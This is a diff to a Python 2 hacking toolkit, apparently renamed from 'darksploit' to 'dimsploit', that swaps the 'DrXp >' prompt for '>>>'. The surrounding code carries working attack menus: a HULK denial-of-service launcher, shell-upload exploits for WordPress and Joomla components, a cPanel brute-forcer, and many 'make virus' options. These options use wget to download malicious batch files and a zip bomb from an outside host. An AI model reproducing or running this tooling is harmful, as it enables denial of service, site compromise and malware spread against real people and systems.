@@ -37,7 +37,7 @@ def main():
 		time.sleep(1)
 		help()
 		main()
-	elif dr == "darksploit update":
+	elif dr == "dimsploit update":
 		print ""+B+"~ "+N+"Updating..."
 		time.sleep(3)
 		print
@@ -182,9 +182,9 @@ def main():
 		main()
 	elif dr == "use exploit/power_dos":
 		print "set target"
-		target = raw_input(""+N+"DrXp > use exploit("+R+"power_dos"+N+"): ")
+		target = raw_input(""+N+">>> use exploit("+R+"power_dos"+N+"): ")
 		print "target =>"+R+"",target
-		run = raw_input(""+N+"DrXp > ")
+		run = raw_input(""+N+">>> ")
 		if run == "run":
 			os.system("cd modules;cd hulk_attacks;python2 hulk.py %s" % (target))
 			print ""+B+"[*]"+N+" Job finished"
@@ -192,10 +192,10 @@ def main():
 			main()
 	elif dr == "use exploit/php_thumb_shell_upload":
 		print "set target"
-		list = raw_input(""+N+"DrXp > ("+R+"php_thumb_shell_upload"+N+"): ")
+		list = raw_input(""+N+">>> ("+R+"php_thumb_shell_upload"+N+"): ")
 		time.sleep(1)
 		print "target =>"+R+"",list
-		go = raw_input(""+N+"DrXp > ")
+		go = raw_input(""+N+">>> ")
 		if go == "run":
 			time.sleep(2)
 			print ""+B+"[*] "+N+"Starting attacks..."
@@ -205,7 +205,7 @@ def main():
 			main()
 	elif dr == "use exploit/cpanel_bruteforce":
 		print "set target"
-		vc = raw_input(""+N+"DrXp > ("+R+"cpanel_bruteforce"+N+"): ")
+		vc = raw_input(""+N+">>> ("+R+"cpanel_bruteforce"+N+"): ")
 		time.sleep(1)
 		print "target => "+R+"",vc
 		usr = raw_input(""+N+"SET user > ")
@@ -220,7 +220,7 @@ def main():
 		pas = raw_input(""+N+"SET savepass > ")
 		time.sleep(1)
 		print "save on => "+R+"",pas
-		god = raw_input(""+N+"DrXp > ")
+		god = raw_input(""+N+">>> ")
 		if god == "run":
 			time.sleep(2)
 			print ""+B+"[*] "+N+"Starting attacks..."
@@ -230,13 +230,13 @@ def main():
 			main()
 	elif dr == "use exploit/joomla_com_hdflayer":
 		print "set target"
-		t = raw_input(""+N+"DrXp > ("+R+"joomla_com_hdflayer"+N+"): ")
+		t = raw_input(""+N+">>> ("+R+"joomla_com_hdflayer"+N+"): ")
 		time.sleep(1)
 		print "target => "+R+"",t
 		f = raw_input(""+N+"SET shellock > ")
 		time.sleep(1)
 		print "target => "+R+"",f
-		r = raw_input(""+N+"DrXp > ")
+		r = raw_input(""+N+">>> ")
 		time.sleep(1)
 		if r == "run":
 			print ""+B+"[*] "+N+"Starting attacks..."
@@ -246,13 +246,13 @@ def main():
 			main()
 	elif dr == "use exploit/wp_symposium_shell_upload":
 		print "set target"
-		vc = raw_input(""+N+"DrXp > ("+R+"wp_symposium_shell_upload"+N+"): ")
+		vc = raw_input(""+N+">>> ("+R+"wp_symposium_shell_upload"+N+"): ")
 		time.sleep(1)
 		print "target => "+R+"",vc
 		fl = raw_input(""+N+"SET shellock > ")
 		time.sleep(1)
 		print "shell location = > "+R+"",fl
-		ru = raw_input(""+N+"DrXp > ")
+		ru = raw_input(""+N+">>> ")
 		time.sleep(2)
 		if ru == "run":
 			print ""+B+"[*] "+N+"Starting attacks..."
@@ -262,13 +262,13 @@ def main():
 			main()
 	elif dr == "use exploit/jm_auto_change_pswd":
 		print "set target"
-		er = raw_input(""+N+"DrXp > ("+R+"jm_auto_change_pswd"+N+"): ")
+		er = raw_input(""+N+">>> ("+R+"jm_auto_change_pswd"+N+"): ")
 		time.sleep(1)
 		print "target =>"+R+"",er
 		pa = raw_input(""+N+"SET newpass > ")
 		time.sleep(1)
 		print "new pass => "+R+"",pa
-		y = raw_input(""+N+"DrXp > ")
+		y = raw_input(""+N+">>> ")
 		time.sleep(2)
 		if y == "run":
 			print ""+B+"[*] "+N+"Starting attacks..."
@@ -278,14 +278,14 @@ def main():
 			main()
 	elif dr == "use exploit/joomla_com_foxcontact":
 		print ""+R+"=> "+N+"set target"
-		ts = raw_input("DrXp > "+R+"("+N+"joomla_com_foxcontact"+R+")"+N+": ")
+		ts = raw_input(">>> "+R+"("+N+"joomla_com_foxcontact"+R+")"+N+": ")
 		print "TARGET => "+R+"",ts
 		time.sleep(1)
 		print ""+N+"=>"+N+" id?"+R+" example.com/index.php?option=com_foxcontact&view=foxcontact&Itemid="+G+"161 "+R+"<="
-		cid = raw_input(""+N+"DrXp > ")
+		cid = raw_input(""+N+">>> ")
 		time.sleep(1)
 		print "CID => "+R+"",cid
-		kt = raw_input(""+N+"DrXp > ")
+		kt = raw_input(""+N+">>> ")
 		if kt == "run":
 			time.sleep(1)
 			print ""+B+"["+R+"*"+B+"]"+N+" Starting attacks..."
@@ -295,9 +295,9 @@ def main():
 			main()
 	elif dr == "use exploit/joomla0day_com_myngallery":
 		print "=>"+G+" Target for example http://locahost/ 1,2,3"
-		ft = raw_input(""+N+"DrXp > ("+R+"joomla0day_com_myngallery"+N+"): ")
+		ft = raw_input(""+N+">>> ("+R+"joomla0day_com_myngallery"+N+"): ")
 		print "target =>"+R+"",ft
-		gr = raw_input(""+N+"DrXp > ")
+		gr = raw_input(""+N+">>> ")
 		if gr == "run":
 			time.sleep(1)
 			print ""+B+"[*] "+N+"Starting attacks..."
@@ -321,7 +321,7 @@ def main():
 			
 			
 	elif dr == "make virus/on_android":
-		android = raw_input(""+N+"DrXp > ")
+		android = raw_input(""+N+">>> ")
 		if android == "run":
 			time.sleep(1)
 			print
@@ -334,7 +334,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_windows_rip":
-		rip = raw_input(""+N+"DrXp > ")
+		rip = raw_input(""+N+">>> ")
 		if rip == "run":
 			print ""+B+"[*]"+N+" Downloading virus..."
 			os.system("cd virus;mkdir RIP;cd RIP;wget http://zumizec-com.waper.co/files/rip.txt;mv rip.txt RIP.bat")
@@ -343,7 +343,7 @@ def main():
 			print ""+B+"[*]"+N+"Job finished..."
 			main()
 	elif dr == "make virus/on_windows_cut":
-			gl = raw_input(""+N+"DrXp > ")
+			gl = raw_input(""+N+">>> ")
 			if gl == "run":
 				print ""+B+"[*]"+N+"Downloading virus..."
 				os.system("cd virus;mkdir cut;cd cut;wget http://zumizec-com.waper.co/files/cut.txt;mv cut.txt cut.bat")
@@ -354,7 +354,7 @@ def main():
 				print
 				main()
 	elif dr == "make virus/on_macosx_trnd":
-		trnd = raw_input(""+N+"DrXp > ")
+		trnd = raw_input(""+N+">>> ")
 		if trnd == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -366,7 +366,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_macosx_nthg":
-		nthg = raw_input(""+N+"DrXp > ")
+		nthg = raw_input(""+N+">>> ")
 		if nthg == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -378,7 +378,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_windows_alay":
-		te = raw_input(""+N+"DrXp > ")
+		te = raw_input(""+N+">>> ")
 		if te == "run":
 			print ""+B+"[*]"+N+" Downloading virus..."
 			time.sleep(1)
@@ -390,7 +390,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_android_boot":
-		opi = raw_input(""+N+"DrXp > ")
+		opi = raw_input(""+N+">>> ")
 		if opi == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -402,7 +402,7 @@ def main():
 		print
 		main()
 	elif dr == "make virus/on_android_zip":
-		gl = raw_input(""+N+"DrXp > ")
+		gl = raw_input(""+N+">>> ")
 		if gl == "run":
 			print ""+B+"[*]"+N+" Downloading virus..."
 			os.system("cd virus;mkdir zipbomb;cd zipbomb;wget http://zumizec-com.waper.co/files/bom-zip.zip")
@@ -413,7 +413,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_windows_caps":
-		pio = raw_input(""+N+"DrXp > ")
+		pio = raw_input(""+N+">>> ")
 		if pio == "run":
 			time.sleep(1)
 		print ""+B+"[*]"+N+" Downloading virus..."
@@ -425,7 +425,7 @@ def main():
 		print
 		main()
 	elif dr == "make virus/on_windows_quiz":
-		quiz = raw_input(""+N+"DrXp > ")
+		quiz = raw_input(""+N+">>> ")
 		if quiz == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -437,7 +437,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_windows_dat":
-		dats = raw_input(""+N+"DrXp > ")
+		dats = raw_input(""+N+">>> ")
 		if dats == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -449,7 +449,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_windows_ugly":
-		ugly = raw_input(""+N+"DrXp > ")
+		ugly = raw_input(""+N+">>> ")
 		if ugly == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -461,7 +461,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_android_frz":
-		rez = raw_input(""+N+"DrXp > ")
+		rez = raw_input(""+N+">>> ")
 		if rez == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -473,7 +473,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_windows_dea":
-		dead = raw_input(""+N+"DrXp > ")
+		dead = raw_input(""+N+">>> ")
 		if dead == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+"downloading virus..."
@@ -485,7 +485,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_windows_cmd":
-		yx = raw_input(""+N+"DrXp > ")
+		yx = raw_input(""+N+">>> ")
 		if yx == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -497,7 +497,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_android_dea":
-		dea = raw_input(""+N+"DrXp > ")
+		dea = raw_input(""+N+">>> ")
 		if dea == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -515,7 +515,7 @@ def main():
 			#########
 			
 	elif dr == "make virus/on_android_andrograve":
-		dea = raw_input(""+N+"DrXp > ")
+		dea = raw_input(""+N+">>> ")
 		if dea == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -528,7 +528,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_android_androrm":
-		dea = raw_input(""+N+"DrXp > ")
+		dea = raw_input(""+N+">>> ")
 		if dea == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -541,7 +541,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_android_androrw":
-		dea = raw_input(""+N+"DrXp > ")
+		dea = raw_input(""+N+">>> ")
 		if dea == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
@@ -554,7 +554,7 @@ def main():
 			print
 			main()
 	elif dr == "make virus/on_android_gokernel":
-		dea = raw_input(""+N+"DrXp > ")
+		dea = raw_input(""+N+">>> ")
 		if dea == "run":
 			time.sleep(1)
 			print ""+B+"[*]"+N+" Downloading virus..."
